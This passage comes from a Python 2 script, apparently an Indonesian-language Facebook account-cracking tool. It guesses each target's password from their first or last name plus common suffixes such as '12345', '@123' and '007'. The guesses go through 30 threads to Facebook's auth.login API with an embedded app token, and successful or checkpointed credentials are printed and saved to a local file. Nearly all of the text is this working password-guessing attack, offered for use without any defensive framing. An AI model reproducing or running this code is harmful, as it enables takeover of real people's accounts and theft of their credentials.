                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = j['first_name'].lower() + '@123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['first_name'].lower() + '007'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['first_name'].lower() + '@12345'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mProses Telah Selesai ...'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92msalin atau copy'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    raw_input('\x1b[1;97m{<\x1b[1;93mKeluar\x1b[1;97m>}')
    os.system('python2 Craker.py')


def user_id():
    os.system('clear')
    print logo12
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    ling = 'https://www.facebook.com/'
    url = ling + raw_input('\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mMasukan Username Akun Fb \x1b[1;92m: ')
    idre = re.compile('"entity_id":"([0-9]+)"')
    page = requests.get(url)
    print idre.findall(page.content)
    raw_input('\n\x1b[1;95m[\x1b[1;97m<Keluar>\x1b[1;95m]')
    menu()


def perbarui():
    os.system('clear')
    print logo6
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80YayanXD\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    jalan('\x1b[1;92mSedang Mengupdate Tools\x1b[1;93m...')
    jalan('\x1b[1;91m=10%')
    jalan('\x1b[1;93m==20%')
    jalan('\x1b[1;92m===30%')
    jalan('\x1b[1;94m====40%')
    jalan('\x1b[1;95m=====50%')
    jalan('\x1b[1;91m======60%')
    jalan('\x1b[1;92m=======70%')
    jalan('\x1b[1;93m========80%')
    jalan('\x1b[1;94m=========90%')
    jalan('\x1b[1;95m==========100%')
    jalan('\x1b[1;96mUpdate  Selesai\x1b[1;93m')
    os.system('git pull origin master')
    raw_input('\n\x1b[1;94m{\x1b[1;97m<Keluar>\x1b[1;94m}')
    os.system('python2 Craker.py')


if __name__ == '__main__':
    menu()
    login()
    masuk() 